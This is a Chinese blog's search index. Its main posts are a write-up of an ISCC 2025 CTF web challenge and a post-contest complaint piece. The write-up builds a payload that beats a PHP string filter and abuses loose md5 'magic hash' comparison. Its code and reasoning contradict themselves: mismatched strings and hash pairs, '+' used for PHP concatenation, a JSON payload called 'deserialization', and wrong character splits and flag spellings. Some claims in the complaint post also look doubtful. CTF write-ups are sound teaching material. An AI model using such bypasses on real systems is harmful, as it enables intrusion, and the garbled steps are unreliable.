<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2025ISCC区域赛WEB</title>
      <link href="/post/7f32bd2a/"/>
      <url>/post/7f32bd2a/</url>
      
        <content type="html"><![CDATA[<h2 id="一、哪吒的试炼"><a href="#一、哪吒的试炼" class="headerlink" title="一、哪吒的试炼"></a>一、哪吒的试炼</h2><h3 id="（一）好好读故事"><a href="#（一）好好读故事" class="headerlink" title="（一）好好读故事"></a>（一）好好读故事</h3><p>进入题目，就看到一段敖丙跟哪吒的对话，很有意思。但是在最后三行，暗含题目的关键信息：<br><img src="/source/img/essay/2025ISCC/%E5%93%AA%E5%90%92%E7%9A%84%E8%AF%95%E7%82%BC/1.png" alt="哪吒的试炼"></p><blockquote><p>敖丙说的*”吃什么食物“<em>，这里有一个</em>”食物“*<br>哪吒回答的*”我要吃藕“<em>，这里有一个</em>”藕“*<br>接着就是封印颤动，说明他俩的这两句话就是题目的突破口</p></blockquote><ul><li><em>食物</em>，是问题，也是参数，在URL链接中使用英文替代，也就是<em>food</em></li><li><em>藕</em>，是答案，也是参数值，在URL链接中使用英文替代，也就是*lotus root</li></ul><blockquote><p>通过这两个关键条件，我们可以构造出一个请求，从而得到答案。<br>请求: ?food&#x3D;lotus%20root 【对空格进行URL编码替换】</p></blockquote><h3 id="（二）修改JS获取源码"><a href="#（二）修改JS获取源码" class="headerlink" title="（二）修改JS获取源码"></a>（二）修改JS获取源码</h3><ol><li>跳转到<em>isflag.php</em>页面，页面中有一个按钮，但是无法点击。<br>很明显：是按钮存在disable属性，无法点击。<br><img src="/source/img/essay/2025ISCC/%E5%93%AA%E5%90%92%E7%9A%84%E8%AF%95%E7%82%BC/2.png" alt="修改JS获取源码"></li><li>我们查看一下页面源码，进行一下验证，的确存在disable属性。<br><img src="/source/img/essay/2025ISCC/%E5%93%AA%E5%90%92%E7%9A%84%E8%AF%95%E7%82%BC/3.png" alt="修改JS获取源码"></li><li>我们可以通过修改JS代码，来实现按钮的点击。</li><li>点击按钮，成功获取到源码。</li></ol><h3 id="（三）代码审计"><a href="#（三）代码审计" class="headerlink" title="（三）代码审计"></a>（三）代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nezha&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$nezha </span>= <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nezha&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$seal_incantation </span>= <span class="variable">$nezha</span>-&gt;incantation;  </span><br><span class="line">    <span class="variable">$md5 </span>= <span class="variable">$nezha</span>-&gt;md5;  </span><br><span class="line">    <span class="variable">$secret_power </span>= <span class="variable">$nezha</span>-&gt;power;</span><br><span class="line">    <span class="variable">$true_incantation </span>= <span class="string">&quot;I_am_the_spirit_of_fire&quot;</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="variable">$final_incantation </span>= <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">preg_quote</span>(<span class="variable">$true_incantation</span>, <span class="string">&#x27;/&#x27;</span>) . <span class="string">&quot;/&quot;</span>, <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="variable">$seal_incantation</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$final_incantation</span> === <span class="variable">$true_incantation</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$secret_power</span>) &amp;&amp; <span class="variable">$md5</span> !== <span class="variable">$secret_power</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_flag</span>(); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;封印的力量依旧存在，你还需要再试试!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h3&gt;夜色渐深，风中传来隐隐的低语……&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;只有真正的勇者才能找到破局之法。&lt;/h3&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="（1）逻辑分析"><a href="#（1）逻辑分析" class="headerlink" title="（1）逻辑分析"></a>（1）逻辑分析</h4><ol><li><p>输入处理 ：</p><ul><li>代码首先检查是否存在POST参数 nezha</li><li>如果存在，使用 json_decode 将其解析为PHP对象</li><li>从对象中提取三个属性： incantation 、 md5 和 power</li></ul></li><li><p>关键变量 ：</p><ul><li>$seal_incantation ：从POST请求中获取的咒语</li><li>$md5 ：从POST请求中获取的md5值</li><li>$secret_power ：从POST请求中获取的力量值</li><li>$true_incantation ：固定值为”I_am_the_spirit_of_fire”</li></ul></li><li><p>字符串处理 ：</p><ul><li>使用 preg_replace 函数从 $seal_incantation 中删除所有出现的$true_incantation</li><li>结果存储在 $final_incantation 中</li></ul></li><li><p>条件判断 ：<br>这个条件包含三个部分：</p><ul><li>$final_incantation &#x3D;&#x3D;&#x3D; $true_incantation ：从 $seal_incantation 中删除所有 $true_incantation 后，结果仍然等于 $true_incantation</li><li>md5($md5) &#x3D;&#x3D; md5($secret_power) ： $md5 和 $secret_power 的md5哈希值相等</li><li>$md5 !&#x3D;&#x3D; $secret_power ： $md5 和 $secret_power 不相等</li></ul></li></ol><h4 id="（2）漏洞分析"><a href="#（2）漏洞分析" class="headerlink" title="（2）漏洞分析"></a>（2）漏洞分析</h4><ol><li>字符串替换漏洞 ：<ul><li>第一个条件要求从 $seal_incantation 中删除所有 $true_incantation 后，结果仍然等于 $true_incantation</li><li>这看似矛盾，但可以通过构造特殊字符串实现，例如： $seal_incantation &#x3D; “I_am_the_spirit_of_fireI_am_the_spirit_of_fire”</li><li>当第一个 I_am_the_spirit_of_fire 被删除后，剩下的正好是 I_am_the_spirit_of_fire</li></ul></li><li>MD5碰撞漏洞 ：<ul><li>第二个和第三个条件要求找到两个不同的值，但它们的MD5哈希值相等</li><li>这是利用MD5哈希碰撞，可以找到具有相同MD5值的不同字符串</li></ul></li></ol><h4 id="（3）解题思路"><a href="#（3）解题思路" class="headerlink" title="（3）解题思路"></a>（3）解题思路</h4><ol><li><p>构造 incantation 参数：</p><ul><li>使用 I_am_the_spirit_of_fireI_am_the_spirit_of_fire 作为值</li></ul></li><li><p>构造 md5 和 power 参数：</p><ul><li>需要找到两个不同的字符串，它们的MD5哈希值相等</li><li>可以使用已知的MD5碰撞对，例如：<ul><li>240610708 和 QNKCDZO （这两个字符串的MD5值都是 0e462097431906509019562988736854 ）</li><li>由于PHP在比较时会将以 0e 开头且后面全是数字的字符串视为科学计数法（值为0），所以这两个字符串的MD5哈希在PHP中会被视为相等</li></ul></li></ul></li></ol><h3 id="（四）构造Payload"><a href="#（四）构造Payload" class="headerlink" title="（四）构造Payload"></a>（四）构造Payload</h3><p>根据以上分析的逻辑，构造反序列化的Payload，提交到服务器，获取flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造JSON对象</span></span><br><span class="line"><span class="variable">$payload</span> = [</span><br><span class="line">    <span class="string">&quot;incantation&quot;</span> =&gt; <span class="string">&quot;I_am_theI_am_the_spirit_of_fire_spirit_of_fire&quot;</span>,</span><br><span class="line">    <span class="string">&quot;md5&quot;</span> =&gt; <span class="string">&quot;QNKCDZO&quot;</span>,</span><br><span class="line">    <span class="string">&quot;power&quot;</span> =&gt; <span class="string">&quot;aabg7XSs&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON对象转换为字符串</span></span><br><span class="line"><span class="variable">$json_payload</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Payload的URL编码</span></span><br><span class="line"><span class="variable">$url_encoded_payload</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$json_payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出URL编码后的Payload</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;nezha=&#x27;</span> + <span class="variable">$url_encoded_payload</span>;</span><br></pre></td></tr></table></figure><p>运行后得到如下Payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nezha=%7b%0a%20%20%22%69%6e%63%61%6e%74%61%74%69%6f%6e%22%3a%20%22%49%5f%61%6d%5f%74%68%65%49%5f%61%6d%5f%74%68%65%5f%73%70%69%72%69%74%5f%6f%66%5f%66%69%72%65%5f%73%70%69%72%69%74%5f%6f%66%5f%66%69%72%65%22%2c%0a%20%20%22%6d%64%35%22%3a%20%22%51%4e%4b%43%44%5a%4f%22%2c%0a%20%20%22%70%6f%77%65%72%22%3a%20%22%61%61%62%67%37%58%53%73%22%0a%7d</span><br></pre></td></tr></table></figure><h3 id="（五）解字迷"><a href="#（五）解字迷" class="headerlink" title="（五）解字迷"></a>（五）解字迷</h3><p>在提交了Payload之后，页面返回了如下内容：<br><img src="/source/img/essay/2025ISCC/%E5%93%AA%E5%90%92%E7%9A%84%E8%AF%95%E7%82%BC/4.png" alt="字谜"></p><ol><li>得到三段内容：</li></ol><ul><li>明&#x3D;suoom</li><li>李&#x3D;woolihc</li><li>ISCC{早晴枫林红}</li></ul><ol start="2"><li>初步探索：</li></ol><ul><li><p>明，可以拆分为：日、月 | 密文：suoom</p><ul><li>日的英文为：sun</li><li>月的英文为：moon<blockquote><p>加密：</p><blockquote><p>前半部分:日的<strong>英文</strong> <strong>去掉最后一个字母</strong>，sun —&gt; su<br>后半部分:月的<strong>英文</strong>，倒序反转后<strong>去掉第一个字母</strong>, moon —&gt; noom —&gt; oom<br>前后两部分拼接，得到:suoom</p></blockquote></blockquote></li></ul></li><li><p>李，可以拆分为：李、王 | 密文：woolihc</p><ul><li>李的英文为：wood</li><li>子的英文为：child<blockquote><p>加密：</p><blockquote><p>前半部分:李的<strong>英文</strong> <strong>去掉最后一个字母</strong>，wood —&gt; woo<br>后半部分:子的<strong>英文</strong>，倒序反转后<strong>去掉第一个字母</strong>, child —&gt; dlihc —&gt; lihc<br>前后两部分拼接，得到:woolihc</p></blockquote></blockquote></li></ul></li></ul><ol start="3"><li><strong>得到加密方式</strong>：</li></ol><ul><li>将汉字，按左右结构或者上下结构，进行拆分，得到两个部分</li><li>前&#x2F;上 半部分:汉字的<strong>英文</strong> <strong>去掉最后一个字母</strong></li><li>后&#x2F;下 半部分:汉字的<strong>英文</strong>，<strong>倒序反转</strong>后<strong>去掉第一个字母</strong></li><li>前后两部分拼接，得到:密文</li></ul><ol start="4"><li>解密：【明文：早晴枫林红】</li></ol><ul><li>早，可以拆分为：日、十 | 密文：suet<ul><li>日的英文为：sun</li><li>十的英文为：ten<blockquote><p>加密：</p><blockquote><p>前半部分:日的<strong>英文</strong> <strong>去掉最后一个字母</strong>，sun —&gt; su<br>后半部分:十的<strong>英文</strong>，倒序反转后<strong>去掉第一个字母</strong>, ten —&gt; net —&gt; et<br>前后两部分拼接，得到:suet</p></blockquote></blockquote></li></ul></li><li>晴，可以拆分为：日、青 | 密文：sueerg<ul><li>日的英文为：sun</li><li>青的英文为：green<blockquote><p>加密：</p><blockquote><p>前半部分:日的<strong>英文</strong> <strong>去掉最后一个字母</strong>，sun —&gt; su<br>后半部分:青的<strong>英文</strong>，倒序反转后<strong>去掉第一个字母</strong>, green —&gt; neerg —&gt; eerg<br>前后两部分拼接，得到:sueerg</p></blockquote></blockquote></li></ul></li><li>枫，可以拆分为：木、风 |<ul><li>木的英文为：wood</li><li>风的英文为：wind<blockquote><p>加密：</p><blockquote><p>前半部分:木的<strong>英文</strong> <strong>去掉最后一个字母</strong>，wood —&gt; woo<br>后半部分:风的<strong>英文</strong>，倒序反转后<strong>去掉第一个字母</strong>, wind —&gt; dniw —&gt; niw<br>前后两部分拼接，得到:wooniw</p></blockquote></blockquote></li></ul></li><li>林，可以拆分为：木、木 | 密文：<ul><li>木的英文为：wood</li><li>木的英文为：wood<blockquote><p>加密：</p><blockquote><p>前半部分:木的<strong>英文</strong> <strong>去掉最后一个字母</strong>，wood —&gt; woo<br>后半部分:木的<strong>英文</strong>，倒序反转后<strong>去掉第一个字母</strong>, wood —&gt; doow —&gt; oow<br>前后两部分拼接，得到:woooow</p></blockquote></blockquote></li></ul></li><li>红，可以拆分为：纟、工 | sillrow<ul><li>纟表示与丝线、纺织、缝纫等相关的意义，这里取”丝绸“</li><li>纟的英文为：sill</li><li>工的英文为：work<blockquote><p>加密：</p><blockquote><p>前半部分:纟的<strong>英文</strong> <strong>去掉最后一个字母</strong>，sill —&gt; sil<br>后半部分:工的<strong>英文</strong>，倒序反转后<strong>去掉第一个字母</strong>, work —&gt; krow —&gt; row<br>前后两部分拼接，得到:silrow</p></blockquote></blockquote></li></ul></li></ul><ol start="5"><li>密文拼接，得到Flag</li></ol><ul><li>suet + sueerg + wooniw + woooow + silrow</li><li>最终Flag:ISCC{suetsueergwooniwwoooowsilrow}</li></ul><h2 id="二、十八铜人阵"><a href="#二、十八铜人阵" class="headerlink" title="二、十八铜人阵"></a>二、十八铜人阵</h2><h2 id="三、想犯大吴疆土吗"><a href="#三、想犯大吴疆土吗" class="headerlink" title="三、想犯大吴疆土吗"></a>三、想犯大吴疆土吗</h2><h2 id="四、ShallowSeek"><a href="#四、ShallowSeek" class="headerlink" title="四、ShallowSeek"></a>四、ShallowSeek</h2><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ISCC </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025全国大学生信息安全与对抗技术竞赛(ISCC)赛后感受</title>
      <link href="/post/5b408a6c/"/>
      <url>/post/5b408a6c/</url>
      
        <content type="html"><![CDATA[<h2 id="一、赛事背景与参赛概况"><a href="#一、赛事背景与参赛概况" class="headerlink" title="一、赛事背景与参赛概况"></a>一、赛事背景与参赛概况</h2><p>2025 年第 22 届全国大学生信息安全与对抗技术竞赛（ISCC）于 5 月 1 日至 18 日举行，覆盖破阵夺旗赛、无限擂台赛、数据安全赛三大线上挑战赛赛道。作为一名参赛队员，我所在的队伍全程参与了线上挑战赛和线上擂台赛两个环节。根据赛制安排，破阵夺旗赛分为校级赛、区域赛和总决赛三级，而无限擂台赛则贯穿整个赛程。</p><p>从规模来看，本届竞赛吸引了全国 1900 多所高校参与，其中 121 所 “双一流” 院校派出代表队，累计参赛人数超过 12 万人次。我们队伍通过校级选拔赛晋级区域赛，但在后续赛程中遭遇了诸多始料未及的挑战。</p><h2 id="二、赛程体验：疲惫与挫败感交织"><a href="#二、赛程体验：疲惫与挫败感交织" class="headerlink" title="二、赛程体验：疲惫与挫败感交织"></a>二、赛程体验：疲惫与挫败感交织</h2><h3 id="（一）高强度赛程与时间压力"><a href="#（一）高强度赛程与时间压力" class="headerlink" title="（一）高强度赛程与时间压力"></a>（一）高强度赛程与时间压力</h3><p>ISCC 线上挑战赛的题目量极大，仅破阵夺旗赛区域赛阶段就包含 WEB、REVERSE、PWN、MISC 等六大类 40 余道题目，且每道题的难度梯度设计陡峭。以 MISC 题型为例，部分题目需要综合运用音频分析、图像隐写、密码学等多领域知识，如某音频题需通过分段采样提取二进制数据，再转换为 ASCII 字符，整个流程需编写复杂脚本实现。</p><p>然而，赛制规定每支队伍最多 3 人参赛，这意味着三人需在 72 小时内完成全部题目的分析、编码和验证。以区域赛为例，我们队伍我负责WEB、MISC，其他两个队友负责：REVERSE、MOBILE、PWN，这是事先分好的责任，因为第一次参赛，经验不足，看到发放的题目之后，直呼“WOC！”。题目量太大，并且对于我们这支参赛经验并不足的队伍来说，非常具有挑战性。<br>有三类赛题：线上挑战赛、擂台赛、数据安全竞赛，我们无奈只能放弃数据安全竞赛，先搞大头线上挑战赛，然后再搞擂台赛。但是到最后，擂台的题目足足有四五十道，我们就做了十余道……并且还有两份wp还没有完成……</p><h3 id="（二）技术问题频发影响竞赛体验"><a href="#（二）技术问题频发影响竞赛体验" class="headerlink" title="（二）技术问题频发影响竞赛体验"></a>（二）技术问题频发影响竞赛体验</h3><ol><li>平台稳定性缺陷<br>竞赛官网（<a href="http://www.isclab.org.cn)在高并发访问时频繁崩溃,尤其在每日/">www.isclab.org.cn）在高并发访问时频繁崩溃，尤其在每日</a> 20:00 题目更新时段，页面加载失败率超过 60%。例如，区域赛第三轮（决赛轮） 8：00-12：30，官网因流量过载导致所有队伍无法进入竞赛网页或者无法打开竞赛题目或者提交 Flag，持续故障达 4.5 小时，而组委会并未及时通过短信、竞赛群公告、竞赛官网通知，未提供补偿方案。</li><li>附件下载异常<br>题目附件常出现下载中断问题。例如，某 REVERSE 题的压缩包（约 25MB）在下载至 80% 时反复卡退，需重新下载 5 次以上才能成功。部分队伍因反复下载消耗大量时间，最终被迫放弃该题。<br>题目遭恶意攻击<br>5 月 15 日，组委会发布公告称 Web 题目遭拒绝服务攻击，导致服务器响应能力下降，部分队伍因无法访问题目而中断解题。尽管组委会取消了 “AuroraX”“MilkTeA” 等涉事队伍的参赛资格，但已对正常参赛队伍造成不可逆的时间损失。</li></ol><h2 id="三、争议焦点：公平性与规则执行"><a href="#三、争议焦点：公平性与规则执行" class="headerlink" title="三、争议焦点：公平性与规则执行"></a>三、争议焦点：公平性与规则执行</h2><h3 id="（一）题目难度调整与评分争议"><a href="#（一）题目难度调整与评分争议" class="headerlink" title="（一）题目难度调整与评分争议"></a>（一）题目难度调整与评分争议</h3><p>破阵夺旗赛总决赛阶段，组委会在未提前通知的情况下调整了 2 道 WEB 题的漏洞利用条件。例如，原预期通过栈溢出即可获取 Flag 的题目，在比赛中期被修改为需结合 Heap Feng Shui 技术。我们队伍在规则调整前已提交符合原题条件的 WP（Writeup），但组委会以 “未满足最新要求” 为由拒绝给分。这种临时变更不仅打乱了战术部署，更引发了对评分标准一致性的质疑。</p><h3 id="（二）资本干预的合理性质疑"><a href="#（二）资本干预的合理性质疑" class="headerlink" title="（二）资本干预的合理性质疑"></a>（二）资本干预的合理性质疑</h3><p>尽管组委会强调竞赛公正性，但赛场中出现的一些现象令人不安。例如，某知名网络安全企业赞助的队伍在擂台赛中频繁提交高难度原创题目，且这些题目在审核通过后迅速被其他强队解出，形成 “出题 - 解题 - 刷分” 的闭环。更值得关注的是，这些队伍在破阵夺旗赛中多次获得提前获取题目漏洞信息的 “特权”，而普通高校队伍对此毫无察觉。</p><h3 id="（三）申诉机制形同虚设"><a href="#（三）申诉机制形同虚设" class="headerlink" title="（三）申诉机制形同虚设"></a>（三）申诉机制形同虚设</h3><p>针对上述问题，我们队伍于 5 月 17 日向赛方客服提交了申诉请求，但截至竞赛结束未收到任何回复。组委会设置的客服，在竞赛群中并没有尽职尽责：在网站出现问题的第一时间没有通知、选手心态受影响也并没有及时安慰、大量选手反馈问题并没有及时回复甚者不回复，存在严重的逃避问题的情况，另外选手单线私聊客服反映情况并没有得到及时的回复，例如我们组在 5 月 16 日 16：25向客服反馈问题，24小时内都没有得到回复，直至 5 月 17 日 20：47才得到回复。这种滞后的反馈机制，使得参赛者在赛后仍无法获得合理的解释。</p><h2 id="四、改进建议与未来展望"><a href="#四、改进建议与未来展望" class="headerlink" title="四、改进建议与未来展望"></a>四、改进建议与未来展望</h2><h3 id="（一）技术保障层面"><a href="#（一）技术保障层面" class="headerlink" title="（一）技术保障层面"></a>（一）技术保障层面</h3><ol><li>云原生架构升级与弹性扩容<br>建议组委会引入云原生微服务架构，将竞赛平台拆分为用户认证、题目管理、数据存储等独立模块，并采用Kubernetes+Docker 容器编排实现资源动态调度。参考亚马逊 ElastiCache Serverless 的实践经验，对高并发场景（如每日 20:00 题目更新时段）启用自动弹性伸缩，确保数据库读写性能提升 300% 以上。同时建立异地多活灾备中心，通过跨区域数据同步机制，将服务中断恢复时间（RTO）控制在 5 分钟以内。</li><li>P2P+CDN 混合分发网络<br>针对大文件附件下载问题，可部署基于WebRTC+WebTorrent的 P2P 分发网络（如 PeerConnect 方案），将服务器负载降低 80% 以上。对于 2GB 以上的 REVERSE 题附件，采用分卷压缩 + 哈希校验技术，用户下载后可通过官网提供的 SHA-256 校验工具快速验证文件完整性。同时建立全球 CDN 节点加速，使偏远地区参赛队的下载速度提升至 5MB&#x2F;s 以上。</li></ol><h3 id="（二）规则制定层面"><a href="#（二）规则制定层面" class="headerlink" title="（二）规则制定层面"></a>（二）规则制定层面</h3><ol><li>区块链存证与透明化管理<br>引入联盟链技术（如 Hyperledger Fabric）构建题目生命周期管理系统：</li></ol><ul><li>题目提交阶段：出题人需通过智能合约上传题目及答案，系统自动生成不可篡改的存证哈希值</li><li>审核阶段：专家评审意见实时上链，形成可追溯的审计日志</li><li>发布阶段：题目更新信息通过预言机（Oracle）同步至所有参赛队终端<br>该方案已在 2024 年金砖国家区块链技术赛项中成功应用，使题目审核效率提升 40%。</li></ul><ol start="2"><li>智能合约驱动的争议解决<br>开发基于 <strong>ODR（在线争议解决）</strong> 的申诉平台，集成以下功能：</li></ol><ul><li>自动分诊系统：通过 NLP 技术分析申诉内容，自动匹配相关规则条款并生成初步处理意见</li><li>智能合约仲裁：对于事实清楚的争议（如平台故障导致的提交失败），系统自动触发补偿机制（如延长答题时间）</li><li>专家在线调解：复杂争议可通过视频会议系统连接仲裁委员会，实现 24 小时内响应<br>该系统可将申诉处理周期缩短至 12 小时以内。</li></ul><h3 id="（三）赛制设计层面"><a href="#（三）赛制设计层面" class="headerlink" title="（三）赛制设计层面"></a>（三）赛制设计层面</h3><ol><li>动态组队与跨学科协作<br>借鉴世界技能大赛云计算赛项经验，允许队伍在区域赛阶段动态调整人员构成：</li></ol><ul><li>基础赛段（48 小时）：固定 3 人团队，重点考察专业深度</li><li>攻坚赛段（24 小时）：可临时招募 1-2 名外援（需提前报备），鼓励跨学科协作（如 Web + 逆向工程组合）<br>同时设置团队协作评分项，根据代码版本控制记录、任务分配合理性等维度进行评估，占总成绩的 15%。</li></ul><ol start="2"><li>双轨制题目生态建设</li></ol><ul><li>基础赛道：题目由组委会统一命制，确保竞赛公平性和知识覆盖面</li><li>创新赛道：开放题目众包平台，允许高校或企业提交原创题目，通过区块链存证和社区投票机制筛选优质题目。被采纳的出题方可获得荣誉积分，用于兑换培训资源或设备赞助该模式已在长三角区块链应用创新大赛中验证，使题目新颖度提升 25%。</li></ul><h3 id="（四）第三方监督与权益保障"><a href="#（四）第三方监督与权益保障" class="headerlink" title="（四）第三方监督与权益保障"></a>（四）第三方监督与权益保障</h3><ol><li>全程审计与黑盒测试<br>邀请中国信息安全测评中心（CNITSEC）作为独立第三方，实施以下监督措施：</li></ol><ul><li>赛前渗透测试：对竞赛平台进行 72 小时压力测试，发现并修复潜在漏洞</li><li>赛中行为监控：通过流量分析系统实时识别异常访问（如每秒超过 100 次的 Flag 提交请求）</li><li>赛后数据校验：对所有提交记录进行区块链存证，确保评分可追溯</li></ul><ol start="2"><li>参赛者权益保障基金<br>从赛事赞助费用中提取 5% 设立专项基金，用于：</li></ol><ul><li>因平台故障导致的时间损失补偿（按每分钟 50 元标准赔付）</li><li>对恶意攻击行为的受害者进行法律援助</li><li>优秀参赛队的技术交流与培训支持<br>该基金的使用需通过智能合约实现透明化管理，每季度公布审计报告。</li></ul><h2 id="五、结语"><a href="#五、结语" class="headerlink" title="五、结语"></a>五、结语</h2><p>2025 年 ISCC 竞赛在技术创新和规模扩展上取得了显著成就，但在赛事组织和用户体验方面仍存在诸多改进空间。作为参赛者，我们理解大型竞赛面临的技术挑战，但也期待组委会能够倾听一线反馈，切实解决平台稳定性、规则公平性等核心问题。唯有如此，ISCC 才能真正成为培养信息安全人才的优质平台，而非消耗学生热情的 “疲劳战场”。</p><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ISCC </category>
          
          <category> 信息安全竞赛 </category>
          
          <category> 线上挑战赛 </category>
          
          <category> 擂台赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 赛后总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GZCTF平台搭建问题合集</title>
      <link href="/post/7d1cd1d7/"/>
      <url>/post/7d1cd1d7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> GZCTF </category>
          
          <category> CTF平台 </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 教程 </tag>
            
            <tag> CTF平台 </tag>
            
            <tag> GZCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu换源</title>
      <link href="/post/e87d94d0/"/>
      <url>/post/e87d94d0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Ubuntu </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Linux </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker安装</title>
      <link href="/post/2a40ac23/"/>
      <url>/post/2a40ac23/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GZCTF平台搭建(仅K8s)</title>
      <link href="/post/c8174473/"/>
      <url>/post/c8174473/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> GZCTF </category>
          
          <category> CTF平台 </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 教程 </tag>
            
            <tag> CTF平台 </tag>
            
            <tag> GZCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GZCTF平台搭建(Docker和K8s)</title>
      <link href="/post/4f79e208/"/>
      <url>/post/4f79e208/</url>
      
